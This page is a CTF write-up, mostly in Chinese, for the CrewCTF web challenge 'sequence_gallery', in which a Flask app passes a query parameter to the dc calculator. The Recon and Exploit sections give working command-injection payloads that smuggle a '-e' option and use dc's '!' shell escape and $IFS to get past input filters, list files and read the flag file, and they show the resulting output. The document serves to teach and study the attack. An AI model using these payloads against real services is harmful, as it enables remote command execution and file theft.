<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  CrewCTF - sequence_gallery
  #


  Background
  #

Command Injection
dc command in Linux with examples
Linux dc命令

dc -h
Usage: dc [OPTION] [file &mldr;]
-e, &ndash;expression=EXPR    evaluate expression
-f, &ndash;file=FILE          evaluate contents of file
-h, &ndash;help               display this help and exit
-V, &ndash;version            output version information and exit
Email bug reports to:  bug-dc@gnu.org .

  Source Code
  #

:::spoiler Source Code
import os
import sqlite3
import subprocess

from flask import Flask, request, render_template

app = Flask(__name__)

@app.get('/')
def index():
	sequence = request.args.get('sequence', None)
	if sequence is None:
		return render_template('index.html')

	script_file = os.path.basename(sequence + '.dc')
	if ' ' in script_file or 'flag' in script_file:
		return ':('

	proc = subprocess.run(
		['dc', script_file], 
		capture_output=True,
		text=True,
		timeout=1,
	)
	output = proc.stdout

	return render_template('index.html', output=output)

if __name__ == '__main__':
	app.run(host='0.0.0.0', port=8080)
:::"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/practice/crewctf/web/crewctf---sequence_gallery/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="CrewCTF - sequence_gallery"><meta property="og:description" content="CrewCTF - sequence_gallery # Background # Command Injection dc command in Linux with examples Linux dc命令
dc -h Usage: dc [OPTION] [file …] -e, –expression=EXPR evaluate expression -f, –file=FILE evaluate contents of file -h, –help display this help and exit -V, –version output version information and exit
Email bug reports to: bug-dc@gnu.org .
Source Code # :::spoiler Source Code
import os import sqlite3 import subprocess from flask import Flask, request, render_template app = Flask(__name__) @app.get('/') def index(): sequence = request.args.get('sequence', None) if sequence is None: return render_template('index.html') script_file = os.path.basename(sequence + '.dc') if ' ' in script_file or 'flag' in script_file: return ':(' proc = subprocess.run( ['dc', script_file], capture_output=True, text=True, timeout=1, ) output = proc.stdout return render_template('index.html', output=output) if __name__ == '__main__': app.run(host='0.0.0.0', port=8080) :::"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="CrewCTF"><meta property="article:tag" content="Web"><title>CrewCTF - sequence_gallery | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/practice/crewctf/web/crewctf---sequence_gallery/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>CrewCTF - sequence_gallery</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source Code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---command-injection>Exploit - Command Injection</a></li><li><a href=#reference>Reference</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=crewctf---sequence_gallery>CrewCTF - sequence_gallery
<a class=anchor href=#crewctf---sequence_gallery>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://lab.feifei.tw/practice/ci/l1.php>Command Injection</a>
<a href=https://www.geeksforgeeks.org/dc-command-in-linux-with-examples/>dc command in Linux with examples</a>
<a href=https://deepinout.com/linux-cmd/linux-numerical-computation-cmd/linux-cmd-dc.html>Linux dc命令</a></p><blockquote><p>dc -h
Usage: dc [OPTION] [file &mldr;]
-e, &ndash;expression=EXPR evaluate expression
-f, &ndash;file=FILE evaluate contents of file
-h, &ndash;help display this help and exit
-V, &ndash;version output version information and exit</p><p>Email bug reports to: <a href=mailto:bug-dc@gnu.org>bug-dc@gnu.org</a> .</p></blockquote><h2 id=source-code>Source Code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source Code</p><pre tabindex=0><code class=language-python! data-lang=python!>import os
import sqlite3
import subprocess

from flask import Flask, request, render_template

app = Flask(__name__)

@app.get(&#39;/&#39;)
def index():
	sequence = request.args.get(&#39;sequence&#39;, None)
	if sequence is None:
		return render_template(&#39;index.html&#39;)

	script_file = os.path.basename(sequence + &#39;.dc&#39;)
	if &#39; &#39; in script_file or &#39;flag&#39; in script_file:
		return &#39;:(&#39;

	proc = subprocess.run(
		[&#39;dc&#39;, script_file], 
		capture_output=True,
		text=True,
		timeout=1,
	)
	output = proc.stdout

	return render_template(&#39;index.html&#39;, output=output)

if __name__ == &#39;__main__&#39;:
	app.run(host=&#39;0.0.0.0&#39;, port=8080)
</code></pre><p>:::</p><h2 id=recon>Recon
<a class=anchor href=#recon>#</a></h2><p>這一題看了一下source code，發現他只是用了sequence參數抓取<code>.dc</code>檔案，然後用subprocess另外執行，所以dc到底是一個甚麼樣的指令?看了其他網站<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup><sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup>，發現它就只是一個calculator，然後他支援自己寫的腳本，所以他就是抓sequence這個get參數，然後做簡單的輸入字串驗證(不能有<code>flag</code>和空格)，所以可以想一下能不能用command injection的手法達到RCE，具體來說還是看了CTFTime上的WP<sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup>才知道可以用<code>!</code>接shell command，實際測試如下:</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ dc -e \!ls
factorial.dc  fibonacchi.dc  flag.txt  main.py  power.dc  templates
</code></pre><pre tabindex=0><code class=language-python! data-lang=python!>$ python
&gt;&gt;&gt; import subprocess
&gt;&gt;&gt; subprocess.run([&#39;dc&#39;, &#34;-e !ls Web/sequence_gallery/dist/src&#34;])
factorial.dc  fibonacchi.dc  flag.txt  main.py  power.dc  templates
CompletedProcess(args=[&#39;dc&#39;, &#39;-e !ls Web/sequence_gallery/dist/src&#39;], returncode=0)
</code></pre><p>兩者的區別是一般的shell需要特別用反斜線在驚嘆號前而在python的interactive mode不需要，所以我們就以python的環境來生成payload
:::warning
用一般的command injection做不出來，我試過`和$但都沒用，因為它是用subprocess去接所以格式不同，不然一般的shell是可以處理這些東西
:::</p><pre tabindex=0><code class=language-python! data-lang=python!>&gt;&gt;&gt; subprocess.run([&#39;dc&#39;, &#34;`id`&#34;])
dc: Could not open file `id`
CompletedProcess(args=[&#39;dc&#39;, &#39;`id`&#39;], returncode=0)
&gt;&gt;&gt; subprocess.run([&#39;dc&#39;, &#39;&#34;$(id)&#34;&#39;])
dc: Could not open file &#34;$(id)&#34;
CompletedProcess(args=[&#39;dc&#39;, &#39;&#34;$(id)&#34;&#39;], returncode=0)
</code></pre><h2 id=exploit---command-injection>Exploit - Command Injection
<a class=anchor href=#exploit---command-injection>#</a></h2><ol><li><p>先測試一般的id能不能顯示
Payload: <code>-e !id</code> $\to$ Wrong(不能有空格)
Payloda: <code>-e%60!id</code> $\to$ Did not show(這邊試了很久，發現是我們的指令沒有一個換行)
Payload: <code>-e%60!id%0a</code> $\to$ Correct(所以其實中間的dummy string可以隨便設定以取代空格但一定要有換行)</p></li><li><p>所以就可以用其他payload讀flag</p><pre tabindex=0><code class=language-bash! data-lang=bash!>/?sequence=-e`!ls%0A
factorial.dc
fibonacchi.dc
flag.txt
main.py
power.dc
templates
&#39;`&#39; (0140) unimplemented 
/?sequence=-e`!cat$IFS*.txt%0A
crew{10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx}
&#39;`&#39; (0140) unimplemented 
</code></pre><p>:::info
最後一個payload必須要是使用$IFS搭配*.txt，不能$IFSf*.txt，這樣會失敗，我想可能是因為字串之間會有衝突吧
:::
Flag: <code>crew{10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx}</code></p></li><li><p>Trick
用<code>dc</code> command執行<code>10 63 67 68 101 107 105 76 85 111 68[dan10!=m]smlmx</code>會顯示<code>DouULikeDC</code>的字樣，算是作者的小趣味</p></li></ol><h2 id=reference>Reference
<a class=anchor href=#reference>#</a></h2><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://www.geeksforgeeks.org/dc-command-in-linux-with-examples/>dc command in Linux with examples</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2><p><a href=https://deepinout.com/linux-cmd/linux-numerical-computation-cmd/linux-cmd-dc.html>Linux dc命令</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3><p><a href=https://ctftime.org/writeup/37413>CTFTime WP</a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#background>Background</a></li><li><a href=#source-code>Source Code</a></li><li><a href=#recon>Recon</a></li><li><a href=#exploit---command-injection>Exploit - Command Injection</a></li><li><a href=#reference>Reference</a></li></ul></nav></div></aside></main></body></html>